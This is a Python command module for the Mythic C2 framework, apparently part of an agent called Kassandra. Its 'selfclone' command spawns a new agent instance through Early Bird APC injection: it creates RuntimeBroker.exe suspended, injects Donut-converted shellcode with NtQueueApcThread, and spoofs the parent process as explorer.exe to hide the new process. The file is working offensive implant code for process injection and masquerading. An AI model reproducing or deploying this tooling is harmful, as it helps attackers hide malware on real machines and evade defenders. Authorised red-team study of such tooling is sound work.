from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import tempfile


class SelfCloneArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="mode",
                type=ParameterType.ChooseOne,
                choices=["earlybird", "process"],
                default_value="earlybird",
                description=(
                    "earlybird: CREATE_SUSPENDED host + Donut shellcode via APC (Early Bird). "
                    "process: legacy CreateProcess of own EXE."
                ),
            ),
            CommandParameter(
                name="parent",
                type=ParameterType.String,
                default_value="explorer.exe",
                description=(
                    "PPID spoof target process name (e.g. explorer.exe). "
                    "Use parent=self for no spoofing (new process is a real child of this agent)."
                ),
            ),
            CommandParameter(
                name="host",
                type=ParameterType.String,
                default_value=r"C:\Windows\System32\RuntimeBroker.exe",
                description=(
                    "Sacrificial host image for earlybird mode "
                    "(created suspended; APC runs before its entry)."
                ),
            ),
        ]

    async def parse_arguments(self):
        # Bare CLI: "selfclone" or "selfclone explorer.exe"
        line = self.command_line.strip()
        if not line:
            self.add_arg("mode", "earlybird")
            self.add_arg("parent", "explorer.exe")
            self.add_arg("host", r"C:\Windows\System32\RuntimeBroker.exe")
            return
        if line.startswith("{"):
            self.load_args_from_dictionary(json.loads(line))
            return
        # Treat free-form text as parent name (legacy)
        self.add_arg("mode", "earlybird")
        self.add_arg("parent", line)
        self.add_arg("host", r"C:\Windows\System32\RuntimeBroker.exe")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class SelfCloneCommand(CommandBase):
    cmd = "selfclone"
    needs_admin = False
    help_cmd = (
        "selfclone [-mode earlybird|process] [-parent explorer.exe|self] "
        "[-host C:\\Windows\\System32\\RuntimeBroker.exe]"
    )
    description = (
        "Spawn a new agent instance. Default earlybird: CREATE_SUSPENDED sacrificial host, "
        "inject Donut shellcode via NtQueueApcThread, resume. "
        "parent=<name> spoofs PPID under that process; parent=self disables PPID spoofing "
        "(host is a real child of this agent). "
        "Mode process: legacy CreateProcess of the on-disk EXE."
    )
    version = 2
    supported_ui_features = []
    author = "@PatchRequest"
    attackmapping = ["T1036.004", "T1055.004"]
    argument_class = SelfCloneArguments
    attributes = CommandAttributes(
        builtin=False
    )

    async def create_go_tasking(
        self, taskData: MythicCommandBase.PTTaskMessageAllData
    ) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        mode = (taskData.args.get_arg("mode") or "earlybird").strip().lower()
        parent = (taskData.args.get_arg("parent") or "explorer.exe").strip()
        host = taskData.args.get_arg("host") or r"C:\Windows\System32\RuntimeBroker.exe"
        no_spoof = parent.lower() == "self"

        taskData.args.add_arg("mode", mode)
        taskData.args.add_arg("parent", parent)
        taskData.args.add_arg("host", host)

        if mode == "earlybird":
            shellcode = await self._shellcode_for_payload(taskData)
            file_resp = await SendMythicRPCFileCreate(
                MythicRPCFileCreateMessage(
                    TaskID=taskData.Task.ID,
                    FileContents=shellcode,
                    Filename="kassandra_selfclone.bin",
                    DeleteAfterFetch=True,
                    IsDownloadFromAgent=False,
                )
            )
            if not file_resp.Success:
                raise Exception(
                    f"selfclone: failed to register shellcode with Mythic: {file_resp.Error}"
                )
            taskData.args.add_arg("shellcode_file_id", file_resp.AgentFileId)
            spoof_note = "no PPID spoof (parent=self)" if no_spoof else f"PPID spoof under {parent}"
            response.DisplayParams = (
                f"mode=earlybird parent={parent} host={host} "
                f"shellcode={len(shellcode)} bytes"
            )
            await SendMythicRPCArtifactCreate(
                MythicRPCArtifactCreateMessage(
                    TaskID=taskData.Task.ID,
                    ArtifactMessage=(
                        f"Early Bird: CreateProcess SUSPENDED, {spoof_note}, "
                        f"host={host}, QueueUserAPC shellcode"
                    ),
                    BaseArtifactType="Process Create",
                )
            )
        elif mode == "process":
            taskData.args.add_arg("shellcode_file_id", "")
            response.DisplayParams = f"mode=process parent={parent}"
            artifact = (
                "CreateProcessW without PPID spoof (parent=self)"
                if no_spoof
                else f"CreateProcessW with PPID spoof under {parent}"
            )
            await SendMythicRPCArtifactCreate(
                MythicRPCArtifactCreateMessage(
                    TaskID=taskData.Task.ID,
                    ArtifactMessage=artifact,
                    BaseArtifactType="Process Create",
                )
            )
        else:
            raise Exception(f"selfclone: unknown mode {mode!r} (use earlybird|process)")

        return response

    async def _shellcode_for_payload(
        self, taskData: MythicCommandBase.PTTaskMessageAllData
    ) -> bytes:
        """Load this callback's payload artifact; Donut-convert if it is still a PE."""
        payload_uuid = taskData.Payload.UUID
        if not payload_uuid:
            raise Exception("selfclone: callback has no payload UUID")

        content_resp = await SendMythicRPCPayloadGetContent(
            MythicRPCPayloadGetContentMessage(PayloadUUID=payload_uuid)
        )
        if not content_resp.Success or not content_resp.Content:
            raise Exception(
                f"selfclone: PayloadGetContent failed: {content_resp.Error or 'empty content'}"
            )

        blob = content_resp.Content
        # Already Donut/PIC shellcode (shellcode payload builds)
        if len(blob) >= 2 and blob[:2] != b"MZ":
            return blob

        # EXE/DLL payload — convert with the same Donut binary used by the builder
        from .builder import run_donut

        with tempfile.TemporaryDirectory(prefix="kassandra_selfclone_") as td:
            pe_path = os.path.join(td, "agent.exe")
            with open(pe_path, "wb") as f:
                f.write(blob)
            sc_path, cmd, log = await run_donut(
                pe_path=pe_path,
                work_dir=td,
                format_name="Binary",
                format_options=[
                    "Binary",
                    "Base64",
                    "C",
                    "Ruby",
                    "Python",
                    "Powershell",
                    "C#",
                    "Hex",
                ],
                bypass_name="Continue on fail",
                bypass_options=["None", "Abort on fail", "Continue on fail"],
            )
            shellcode = open(sc_path, "rb").read()
            if not shellcode:
                raise Exception(f"selfclone: Donut produced empty shellcode\n{cmd}\n{log}")
            return shellcode

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
